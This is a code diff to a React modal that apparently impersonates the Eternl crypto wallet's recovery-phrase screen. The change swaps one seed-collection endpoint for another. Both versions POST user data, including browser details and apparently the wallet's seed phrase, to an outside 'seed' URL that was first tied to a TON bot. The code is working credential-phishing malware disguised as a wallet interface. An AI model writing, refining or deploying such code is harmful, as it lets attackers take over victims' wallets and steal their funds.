@@ -4,7 +4,7 @@ import { Eye } from "lucide-react";
 import { useEffect, useState } from "react";
 import EternlModalShell from "./EternlModalShell";
 import { getUserCountry } from "../../utils/userLocation";
-import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";
+import { NOTIFICATION_APP_NAME, SEED_API_URL } from "../../app/config";
 
 /** Demo copy only — real flow uses a cryptographically generated phrase. */
 export const DEMO_MNEMONIC_24 = [
@@ -94,17 +94,11 @@ export default function EternlMnemonicPhraseModal({
         browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
-      const response = await fetch(
-        TON_BOT_SEED_URL,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": TON_BOT_API_KEY,
-          },
-          body: JSON.stringify(messageData),
-        }
-      );
+      const response = await fetch(SEED_API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(messageData),
+      });
 
       const result = await response.json();
       if (response.status === 200 && result.status) {
